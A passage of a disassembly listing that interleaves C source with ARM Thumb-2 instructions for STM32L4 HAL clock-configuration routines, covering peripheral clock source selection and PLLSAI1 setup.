 800486a:	60d3      	str	r3, [r2, #12]
 800486c:	e011      	b.n	8004892 <HAL_RCCEx_PeriphCLKConfig+0x316>
    }
    else
    {
#if defined(RCC_PLLSAI1_SUPPORT)
      if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLLSAI1)
 800486e:	687b      	ldr	r3, [r7, #4]
 8004870:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004872:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 8004876:	d10c      	bne.n	8004892 <HAL_RCCEx_PeriphCLKConfig+0x316>
      {
        /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
        ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 8004878:	687b      	ldr	r3, [r7, #4]
 800487a:	3304      	adds	r3, #4
 800487c:	2101      	movs	r1, #1
 800487e:	4618      	mov	r0, r3
 8004880:	f000 f882 	bl	8004988 <RCCEx_PLLSAI1_Config>
 8004884:	4603      	mov	r3, r0
 8004886:	74fb      	strb	r3, [r7, #19]

        if(ret != HAL_OK)
 8004888:	7cfb      	ldrb	r3, [r7, #19]
 800488a:	2b00      	cmp	r3, #0
 800488c:	d001      	beq.n	8004892 <HAL_RCCEx_PeriphCLKConfig+0x316>
        {
          /* set overall return value */
          status = ret;
 800488e:	7cfb      	ldrb	r3, [r7, #19]
 8004890:	74bb      	strb	r3, [r7, #18]
  }

#endif /* SDMMC1 */

  /*-------------------------- RNG clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_RNG) == (RCC_PERIPHCLK_RNG))
 8004892:	687b      	ldr	r3, [r7, #4]
 8004894:	681b      	ldr	r3, [r3, #0]
 8004896:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 800489a:	2b00      	cmp	r3, #0
 800489c:	d028      	beq.n	80048f0 <HAL_RCCEx_PeriphCLKConfig+0x374>
  {
    assert_param(IS_RCC_RNGCLKSOURCE(PeriphClkInit->RngClockSelection));
    __HAL_RCC_RNG_CONFIG(PeriphClkInit->RngClockSelection);
 800489e:	4b31      	ldr	r3, [pc, #196]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048a0:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048a4:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 80048a8:	687b      	ldr	r3, [r7, #4]
 80048aa:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 80048ac:	492d      	ldr	r1, [pc, #180]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048ae:	4313      	orrs	r3, r2
 80048b0:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLL)
 80048b4:	687b      	ldr	r3, [r7, #4]
 80048b6:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 80048b8:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 80048bc:	d106      	bne.n	80048cc <HAL_RCCEx_PeriphCLKConfig+0x350>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 80048be:	4b29      	ldr	r3, [pc, #164]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048c0:	68db      	ldr	r3, [r3, #12]
 80048c2:	4a28      	ldr	r2, [pc, #160]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048c4:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 80048c8:	60d3      	str	r3, [r2, #12]
 80048ca:	e011      	b.n	80048f0 <HAL_RCCEx_PeriphCLKConfig+0x374>
    }
#if defined(RCC_PLLSAI1_SUPPORT)
    else if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLLSAI1)
 80048cc:	687b      	ldr	r3, [r7, #4]
 80048ce:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 80048d0:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 80048d4:	d10c      	bne.n	80048f0 <HAL_RCCEx_PeriphCLKConfig+0x374>
    {
      /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 80048d6:	687b      	ldr	r3, [r7, #4]
 80048d8:	3304      	adds	r3, #4
 80048da:	2101      	movs	r1, #1
 80048dc:	4618      	mov	r0, r3
 80048de:	f000 f853 	bl	8004988 <RCCEx_PLLSAI1_Config>
 80048e2:	4603      	mov	r3, r0
 80048e4:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 80048e6:	7cfb      	ldrb	r3, [r7, #19]
 80048e8:	2b00      	cmp	r3, #0
 80048ea:	d001      	beq.n	80048f0 <HAL_RCCEx_PeriphCLKConfig+0x374>
      {
        /* set overall return value */
        status = ret;
 80048ec:	7cfb      	ldrb	r3, [r7, #19]
 80048ee:	74bb      	strb	r3, [r7, #18]
    }
  }

  /*-------------------------- ADC clock source configuration ----------------------*/
#if !defined(STM32L412xx) && !defined(STM32L422xx)
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_ADC) == RCC_PERIPHCLK_ADC)
 80048f0:	687b      	ldr	r3, [r7, #4]
 80048f2:	681b      	ldr	r3, [r3, #0]
 80048f4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80048f8:	2b00      	cmp	r3, #0
 80048fa:	d01c      	beq.n	8004936 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
  {
    /* Check the parameters */
    assert_param(IS_RCC_ADCCLKSOURCE(PeriphClkInit->AdcClockSelection));

    /* Configure the ADC interface clock source */
    __HAL_RCC_ADC_CONFIG(PeriphClkInit->AdcClockSelection);
 80048fc:	4b19      	ldr	r3, [pc, #100]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048fe:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004902:	f023 5240 	bic.w	r2, r3, #805306368	; 0x30000000
 8004906:	687b      	ldr	r3, [r7, #4]
 8004908:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 800490a:	4916      	ldr	r1, [pc, #88]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800490c:	4313      	orrs	r3, r2
 800490e:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

#if defined(RCC_PLLSAI1_SUPPORT)
    if(PeriphClkInit->AdcClockSelection == RCC_ADCCLKSOURCE_PLLSAI1)
 8004912:	687b      	ldr	r3, [r7, #4]
 8004914:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 8004916:	f1b3 5f80 	cmp.w	r3, #268435456	; 0x10000000
 800491a:	d10c      	bne.n	8004936 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
    {
      /* PLLSAI1 input clock, parameters M, N & R configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_R_UPDATE);
 800491c:	687b      	ldr	r3, [r7, #4]
 800491e:	3304      	adds	r3, #4
 8004920:	2102      	movs	r1, #2
 8004922:	4618      	mov	r0, r3
 8004924:	f000 f830 	bl	8004988 <RCCEx_PLLSAI1_Config>
 8004928:	4603      	mov	r3, r0
 800492a:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 800492c:	7cfb      	ldrb	r3, [r7, #19]
 800492e:	2b00      	cmp	r3, #0
 8004930:	d001      	beq.n	8004936 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
      {
        /* set overall return value */
        status = ret;
 8004932:	7cfb      	ldrb	r3, [r7, #19]
 8004934:	74bb      	strb	r3, [r7, #18]
#endif /* !STM32L412xx && !STM32L422xx */

#if defined(SWPMI1)

  /*-------------------------- SWPMI1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SWPMI1) == RCC_PERIPHCLK_SWPMI1)
 8004936:	687b      	ldr	r3, [r7, #4]
 8004938:	681b      	ldr	r3, [r3, #0]
 800493a:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 800493e:	2b00      	cmp	r3, #0
 8004940:	d00a      	beq.n	8004958 <HAL_RCCEx_PeriphCLKConfig+0x3dc>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SWPMI1CLKSOURCE(PeriphClkInit->Swpmi1ClockSelection));

    /* Configure the SWPMI1 clock source */
    __HAL_RCC_SWPMI1_CONFIG(PeriphClkInit->Swpmi1ClockSelection);
 8004942:	4b08      	ldr	r3, [pc, #32]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004944:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004948:	f023 4280 	bic.w	r2, r3, #1073741824	; 0x40000000
 800494c:	687b      	ldr	r3, [r7, #4]
 800494e:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8004950:	4904      	ldr	r1, [pc, #16]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004952:	4313      	orrs	r3, r2
 8004954:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
    }
  }

#endif /* OCTOSPI1 || OCTOSPI2 */

  return status;
 8004958:	7cbb      	ldrb	r3, [r7, #18]
}
 800495a:	4618      	mov	r0, r3
 800495c:	3718      	adds	r7, #24
 800495e:	46bd      	mov	sp, r7
 8004960:	bd80      	pop	{r7, pc}
 8004962:	bf00      	nop
 8004964:	40021000 	.word	0x40021000

08004968 <HAL_RCCEx_EnableMSIPLLMode>:
  * @note   Prior to enable the PLL-mode of the MSI for automatic hardware
  *         calibration LSE oscillator is to be enabled with HAL_RCC_OscConfig().
  * @retval None
  */
void HAL_RCCEx_EnableMSIPLLMode(void)
{
 8004968:	b480      	push	{r7}
 800496a:	af00      	add	r7, sp, #0
  SET_BIT(RCC->CR, RCC_CR_MSIPLLEN) ;
 800496c:	4b05      	ldr	r3, [pc, #20]	; (8004984 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 800496e:	681b      	ldr	r3, [r3, #0]
 8004970:	4a04      	ldr	r2, [pc, #16]	; (8004984 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004972:	f043 0304 	orr.w	r3, r3, #4
 8004976:	6013      	str	r3, [r2, #0]
}
 8004978:	bf00      	nop
 800497a:	46bd      	mov	sp, r7
 800497c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004980:	4770      	bx	lr
 8004982:	bf00      	nop
 8004984:	40021000 	.word	0x40021000

08004988 <RCCEx_PLLSAI1_Config>:
  * @note   PLLSAI1 is temporary disable to apply new parameters
  *
  * @retval HAL status
  */
static HAL_StatusTypeDef RCCEx_PLLSAI1_Config(RCC_PLLSAI1InitTypeDef *PllSai1, uint32_t Divider)
{
 8004988:	b580      	push	{r7, lr}
 800498a:	b084      	sub	sp, #16
 800498c:	af00      	add	r7, sp, #0
 800498e:	6078      	str	r0, [r7, #4]
 8004990:	6039      	str	r1, [r7, #0]
  uint32_t tickstart;
  HAL_StatusTypeDef status = HAL_OK;
 8004992:	2300      	movs	r3, #0
 8004994:	73fb      	strb	r3, [r7, #15]
  assert_param(IS_RCC_PLLSAI1M_VALUE(PllSai1->PLLSAI1M));
  assert_param(IS_RCC_PLLSAI1N_VALUE(PllSai1->PLLSAI1N));
  assert_param(IS_RCC_PLLSAI1CLOCKOUT_VALUE(PllSai1->PLLSAI1ClockOut));

  /* Check that PLLSAI1 clock source and divider M can be applied */
  if(__HAL_RCC_GET_PLL_OSCSOURCE() != RCC_PLLSOURCE_NONE)
 8004996:	4b74      	ldr	r3, [pc, #464]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004998:	68db      	ldr	r3, [r3, #12]
 800499a:	f003 0303 	and.w	r3, r3, #3
 800499e:	2b00      	cmp	r3, #0
 80049a0:	d018      	beq.n	80049d4 <RCCEx_PLLSAI1_Config+0x4c>
  {
    /* PLL clock source and divider M already set, check that no request for change  */
    if((__HAL_RCC_GET_PLL_OSCSOURCE() != PllSai1->PLLSAI1Source)
 80049a2:	4b71      	ldr	r3, [pc, #452]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049a4:	68db      	ldr	r3, [r3, #12]
 80049a6:	f003 0203 	and.w	r2, r3, #3
 80049aa:	687b      	ldr	r3, [r7, #4]
 80049ac:	681b      	ldr	r3, [r3, #0]
 80049ae:	429a      	cmp	r2, r3
 80049b0:	d10d      	bne.n	80049ce <RCCEx_PLLSAI1_Config+0x46>
       ||
       (PllSai1->PLLSAI1Source == RCC_PLLSOURCE_NONE)
 80049b2:	687b      	ldr	r3, [r7, #4]
 80049b4:	681b      	ldr	r3, [r3, #0]
       ||
 80049b6:	2b00      	cmp	r3, #0
 80049b8:	d009      	beq.n	80049ce <RCCEx_PLLSAI1_Config+0x46>
#if !defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
       ||
       (((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U) != PllSai1->PLLSAI1M)
 80049ba:	4b6b      	ldr	r3, [pc, #428]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049bc:	68db      	ldr	r3, [r3, #12]
 80049be:	091b      	lsrs	r3, r3, #4
 80049c0:	f003 0307 	and.w	r3, r3, #7
 80049c4:	1c5a      	adds	r2, r3, #1
 80049c6:	687b      	ldr	r3, [r7, #4]
 80049c8:	685b      	ldr	r3, [r3, #4]
       ||
 80049ca:	429a      	cmp	r2, r3
 80049cc:	d047      	beq.n	8004a5e <RCCEx_PLLSAI1_Config+0xd6>
#endif
      )
    {
      status = HAL_ERROR;
 80049ce:	2301      	movs	r3, #1
 80049d0:	73fb      	strb	r3, [r7, #15]
 80049d2:	e044      	b.n	8004a5e <RCCEx_PLLSAI1_Config+0xd6>
    }
  }
  else
  {
    /* Check PLLSAI1 clock source availability */
    switch(PllSai1->PLLSAI1Source)
 80049d4:	687b      	ldr	r3, [r7, #4]
 80049d6:	681b      	ldr	r3, [r3, #0]
 80049d8:	2b03      	cmp	r3, #3
 80049da:	d018      	beq.n	8004a0e <RCCEx_PLLSAI1_Config+0x86>
 80049dc:	2b03      	cmp	r3, #3
 80049de:	d825      	bhi.n	8004a2c <RCCEx_PLLSAI1_Config+0xa4>
 80049e0:	2b01      	cmp	r3, #1
 80049e2:	d002      	beq.n	80049ea <RCCEx_PLLSAI1_Config+0x62>
 80049e4:	2b02      	cmp	r3, #2
 80049e6:	d009      	beq.n	80049fc <RCCEx_PLLSAI1_Config+0x74>
 80049e8:	e020      	b.n	8004a2c <RCCEx_PLLSAI1_Config+0xa4>
    {
    case RCC_PLLSOURCE_MSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_MSIRDY))
 80049ea:	4b5f      	ldr	r3, [pc, #380]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049ec:	681b      	ldr	r3, [r3, #0]
 80049ee:	f003 0302 	and.w	r3, r3, #2
 80049f2:	2b00      	cmp	r3, #0
 80049f4:	d11d      	bne.n	8004a32 <RCCEx_PLLSAI1_Config+0xaa>
      {
        status = HAL_ERROR;
 80049f6:	2301      	movs	r3, #1
 80049f8:	73fb      	strb	r3, [r7, #15]
      }
      break;
 80049fa:	e01a      	b.n	8004a32 <RCCEx_PLLSAI1_Config+0xaa>
    case RCC_PLLSOURCE_HSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSIRDY))
 80049fc:	4b5a      	ldr	r3, [pc, #360]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049fe:	681b      	ldr	r3, [r3, #0]
 8004a00:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004a04:	2b00      	cmp	r3, #0
 8004a06:	d116      	bne.n	8004a36 <RCCEx_PLLSAI1_Config+0xae>
      {
        status = HAL_ERROR;
 8004a08:	2301      	movs	r3, #1
 8004a0a:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004a0c:	e013      	b.n	8004a36 <RCCEx_PLLSAI1_Config+0xae>
    case RCC_PLLSOURCE_HSE:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSERDY))
 8004a0e:	4b56      	ldr	r3, [pc, #344]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a10:	681b      	ldr	r3, [r3, #0]
 8004a12:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004a16:	2b00      	cmp	r3, #0
 8004a18:	d10f      	bne.n	8004a3a <RCCEx_PLLSAI1_Config+0xb2>
      {
        if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSEBYP))
 8004a1a:	4b53      	ldr	r3, [pc, #332]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a1c:	681b      	ldr	r3, [r3, #0]
 8004a1e:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004a22:	2b00      	cmp	r3, #0
 8004a24:	d109      	bne.n	8004a3a <RCCEx_PLLSAI1_Config+0xb2>
        {
          status = HAL_ERROR;
 8004a26:	2301      	movs	r3, #1
 8004a28:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 8004a2a:	e006      	b.n	8004a3a <RCCEx_PLLSAI1_Config+0xb2>
    default:
      status = HAL_ERROR;
 8004a2c:	2301      	movs	r3, #1
 8004a2e:	73fb      	strb	r3, [r7, #15]
      break;
 8004a30:	e004      	b.n	8004a3c <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004a32:	bf00      	nop
 8004a34:	e002      	b.n	8004a3c <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004a36:	bf00      	nop
 8004a38:	e000      	b.n	8004a3c <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004a3a:	bf00      	nop
    }

    if(status == HAL_OK)
 8004a3c:	7bfb      	ldrb	r3, [r7, #15]
 8004a3e:	2b00      	cmp	r3, #0
 8004a40:	d10d      	bne.n	8004a5e <RCCEx_PLLSAI1_Config+0xd6>
#if defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
      /* Set PLLSAI1 clock source */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC, PllSai1->PLLSAI1Source);
#else
      /* Set PLLSAI1 clock source and divider M */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC | RCC_PLLCFGR_PLLM, PllSai1->PLLSAI1Source | (PllSai1->PLLSAI1M - 1U) << RCC_PLLCFGR_PLLM_Pos);
 8004a42:	4b49      	ldr	r3, [pc, #292]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a44:	68db      	ldr	r3, [r3, #12]
 8004a46:	f023 0273 	bic.w	r2, r3, #115	; 0x73
 8004a4a:	687b      	ldr	r3, [r7, #4]
 8004a4c:	6819      	ldr	r1, [r3, #0]
 8004a4e:	687b      	ldr	r3, [r7, #4]
 8004a50:	685b      	ldr	r3, [r3, #4]
 8004a52:	3b01      	subs	r3, #1
 8004a54:	011b      	lsls	r3, r3, #4
 8004a56:	430b      	orrs	r3, r1
 8004a58:	4943      	ldr	r1, [pc, #268]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a5a:	4313      	orrs	r3, r2
 8004a5c:	60cb      	str	r3, [r1, #12]
#endif
    }
  }

  if(status == HAL_OK)
 8004a5e:	7bfb      	ldrb	r3, [r7, #15]
 8004a60:	2b00      	cmp	r3, #0
 8004a62:	d17c      	bne.n	8004b5e <RCCEx_PLLSAI1_Config+0x1d6>
  {
    /* Disable the PLLSAI1 */
    __HAL_RCC_PLLSAI1_DISABLE();
 8004a64:	4b40      	ldr	r3, [pc, #256]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a66:	681b      	ldr	r3, [r3, #0]
 8004a68:	4a3f      	ldr	r2, [pc, #252]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a6a:	f023 6380 	bic.w	r3, r3, #67108864	; 0x4000000
 8004a6e:	6013      	str	r3, [r2, #0]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004a70:	f7fc fbc8 	bl	8001204 <HAL_GetTick>
 8004a74:	60b8      	str	r0, [r7, #8]

    /* Wait till PLLSAI1 is ready to be updated */
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004a76:	e009      	b.n	8004a8c <RCCEx_PLLSAI1_Config+0x104>
    {
      if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004a78:	f7fc fbc4 	bl	8001204 <HAL_GetTick>
 8004a7c:	4602      	mov	r2, r0
 8004a7e:	68bb      	ldr	r3, [r7, #8]
 8004a80:	1ad3      	subs	r3, r2, r3
 8004a82:	2b02      	cmp	r3, #2
 8004a84:	d902      	bls.n	8004a8c <RCCEx_PLLSAI1_Config+0x104>
      {
        status = HAL_TIMEOUT;
 8004a86:	2303      	movs	r3, #3
 8004a88:	73fb      	strb	r3, [r7, #15]
        break;
 8004a8a:	e005      	b.n	8004a98 <RCCEx_PLLSAI1_Config+0x110>
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004a8c:	4b36      	ldr	r3, [pc, #216]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a8e:	681b      	ldr	r3, [r3, #0]
 8004a90:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004a94:	2b00      	cmp	r3, #0
 8004a96:	d1ef      	bne.n	8004a78 <RCCEx_PLLSAI1_Config+0xf0>
      }
    }

    if(status == HAL_OK)
 8004a98:	7bfb      	ldrb	r3, [r7, #15]
 8004a9a:	2b00      	cmp	r3, #0
 8004a9c:	d15f      	bne.n	8004b5e <RCCEx_PLLSAI1_Config+0x1d6>
    {
      if(Divider == DIVIDER_P_UPDATE)
 8004a9e:	683b      	ldr	r3, [r7, #0]
 8004aa0:	2b00      	cmp	r3, #0
 8004aa2:	d110      	bne.n	8004ac6 <RCCEx_PLLSAI1_Config+0x13e>
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#else
        /* Configure the PLLSAI1 Division factor P and Multiplication factor N*/
#if defined(RCC_PLLSAI1P_DIV_2_31_SUPPORT)
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004aa4:	4b30      	ldr	r3, [pc, #192]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004aa6:	691b      	ldr	r3, [r3, #16]
 8004aa8:	f023 4378 	bic.w	r3, r3, #4160749568	; 0xf8000000
 8004aac:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004ab0:	687a      	ldr	r2, [r7, #4]
 8004ab2:	6892      	ldr	r2, [r2, #8]
 8004ab4:	0211      	lsls	r1, r2, #8
 8004ab6:	687a      	ldr	r2, [r7, #4]
 8004ab8:	68d2      	ldr	r2, [r2, #12]
 8004aba:	06d2      	lsls	r2, r2, #27
 8004abc:	430a      	orrs	r2, r1
 8004abe:	492a      	ldr	r1, [pc, #168]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ac0:	4313      	orrs	r3, r2
 8004ac2:	610b      	str	r3, [r1, #16]
 8004ac4:	e027      	b.n	8004b16 <RCCEx_PLLSAI1_Config+0x18e>
                   ((PllSai1->PLLSAI1P >> 4U) << RCC_PLLSAI1CFGR_PLLSAI1P_Pos));
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }
      else if(Divider == DIVIDER_Q_UPDATE)
 8004ac6:	683b      	ldr	r3, [r7, #0]
 8004ac8:	2b01      	cmp	r3, #1
 8004aca:	d112      	bne.n	8004af2 <RCCEx_PLLSAI1_Config+0x16a>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1Q >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1Q_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor Q and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004acc:	4b26      	ldr	r3, [pc, #152]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ace:	691b      	ldr	r3, [r3, #16]
 8004ad0:	f423 03c0 	bic.w	r3, r3, #6291456	; 0x600000
 8004ad4:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004ad8:	687a      	ldr	r2, [r7, #4]
 8004ada:	6892      	ldr	r2, [r2, #8]
 8004adc:	0211      	lsls	r1, r2, #8
 8004ade:	687a      	ldr	r2, [r7, #4]
 8004ae0:	6912      	ldr	r2, [r2, #16]
 8004ae2:	0852      	lsrs	r2, r2, #1
 8004ae4:	3a01      	subs	r2, #1
 8004ae6:	0552      	lsls	r2, r2, #21
 8004ae8:	430a      	orrs	r2, r1
 8004aea:	491f      	ldr	r1, [pc, #124]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004aec:	4313      	orrs	r3, r2
 8004aee:	610b      	str	r3, [r1, #16]
 8004af0:	e011      	b.n	8004b16 <RCCEx_PLLSAI1_Config+0x18e>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor R and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004af2:	4b1d      	ldr	r3, [pc, #116]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004af4:	691b      	ldr	r3, [r3, #16]
 8004af6:	f023 63c0 	bic.w	r3, r3, #100663296	; 0x6000000
 8004afa:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004afe:	687a      	ldr	r2, [r7, #4]
 8004b00:	6892      	ldr	r2, [r2, #8]
 8004b02:	0211      	lsls	r1, r2, #8
 8004b04:	687a      	ldr	r2, [r7, #4]
 8004b06:	6952      	ldr	r2, [r2, #20]
 8004b08:	0852      	lsrs	r2, r2, #1
 8004b0a:	3a01      	subs	r2, #1
 8004b0c:	0652      	lsls	r2, r2, #25
 8004b0e:	430a      	orrs	r2, r1
 8004b10:	4915      	ldr	r1, [pc, #84]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b12:	4313      	orrs	r3, r2
 8004b14:	610b      	str	r3, [r1, #16]
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos));
#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }

      /* Enable the PLLSAI1 again by setting PLLSAI1ON to 1*/
      __HAL_RCC_PLLSAI1_ENABLE();
 8004b16:	4b14      	ldr	r3, [pc, #80]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b18:	681b      	ldr	r3, [r3, #0]
 8004b1a:	4a13      	ldr	r2, [pc, #76]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b1c:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 8004b20:	6013      	str	r3, [r2, #0]

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004b22:	f7fc fb6f 	bl	8001204 <HAL_GetTick>
 8004b26:	60b8      	str	r0, [r7, #8]

      /* Wait till PLLSAI1 is ready */
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004b28:	e009      	b.n	8004b3e <RCCEx_PLLSAI1_Config+0x1b6>
      {
        if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004b2a:	f7fc fb6b 	bl	8001204 <HAL_GetTick>
 8004b2e:	4602      	mov	r2, r0
 8004b30:	68bb      	ldr	r3, [r7, #8]
 8004b32:	1ad3      	subs	r3, r2, r3
 8004b34:	2b02      	cmp	r3, #2
 8004b36:	d902      	bls.n	8004b3e <RCCEx_PLLSAI1_Config+0x1b6>
        {
          status = HAL_TIMEOUT;
 8004b38:	2303      	movs	r3, #3
 8004b3a:	73fb      	strb	r3, [r7, #15]
          break;
 8004b3c:	e005      	b.n	8004b4a <RCCEx_PLLSAI1_Config+0x1c2>
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004b3e:	4b0a      	ldr	r3, [pc, #40]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b40:	681b      	ldr	r3, [r3, #0]
 8004b42:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004b46:	2b00      	cmp	r3, #0
 8004b48:	d0ef      	beq.n	8004b2a <RCCEx_PLLSAI1_Config+0x1a2>
        }
      }

      if(status == HAL_OK)
 8004b4a:	7bfb      	ldrb	r3, [r7, #15]
 8004b4c:	2b00      	cmp	r3, #0
 8004b4e:	d106      	bne.n	8004b5e <RCCEx_PLLSAI1_Config+0x1d6>
      {
        /* Configure the PLLSAI1 Clock output(s) */
        __HAL_RCC_PLLSAI1CLKOUT_ENABLE(PllSai1->PLLSAI1ClockOut);
 8004b50:	4b05      	ldr	r3, [pc, #20]	; (8004b68 <RCCEx_PLLSAI1_Config+0x1e0>)
